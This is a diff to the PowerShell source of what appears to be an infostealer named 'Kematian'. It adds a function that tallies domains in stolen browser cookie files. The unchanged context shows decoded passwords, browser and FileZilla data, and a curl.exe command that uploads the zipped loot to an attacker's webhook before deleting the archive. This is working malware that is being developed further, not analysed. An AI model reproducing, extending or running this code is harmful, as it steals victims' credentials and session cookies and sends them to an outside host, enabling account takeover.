@@ -868,7 +868,30 @@ Pass: $decodedPass
     } while ($dirs.Count -gt 0)
 	
     Write-Host "[!] Getting information about the extracted data !" -ForegroundColor Green
-    Write-Host "`r `n"
+	
+	function Process-CookieFiles {
+    $domaindetects = New-Item -ItemType Directory -Path "$folder_general\DomainDetects" -Force
+    $cookieFiles = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*"
+    foreach ($file in $cookieFiles) {
+        $outputFileName = $file.Name -replace "^cookies_netscape_|-Browser"
+        $fileContents = Get-Content -Path $file.FullName
+        $domainCounts = @{}
+        foreach ($line in $fileContents) {
+            if ($line -match "^\s*(\S+)\s") {
+                $domain = $matches[1].TrimStart('.')
+                if ($domainCounts.ContainsKey($domain)) {
+                    $domainCounts[$domain]++
+                } else {
+                    $domainCounts[$domain] = 1
+                }
+            }
+        }
+        $outputString = ($domainCounts.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name) ($($_.Value))" }) -join "`n"
+        $outputFilePath = Join-Path -Path $domaindetects -ChildPath $outputFileName
+        Set-Content -Path $outputFilePath -Value $outputString
+    }
+    }
+    Process-CookieFiles 
 	
     # Send info about the data in the Kematian.zip
     function kematianinfo {	
@@ -1089,7 +1112,6 @@ FileZilla: $filezilla_info
     curl.exe -X POST -F 'payload_json={\"username\": \"Kematian\", \"content\": \"\", \"avatar_url\": \"https://i.imgur.com/6w6qWCB.jpeg\"}' -F "file=@$env:LOCALAPPDATA\Temp\Kematian.zip" $webhook | Out-Null
     
     Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
-    Write-Host "`r `n"
 	
     # cleanup
     Remove-Item "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
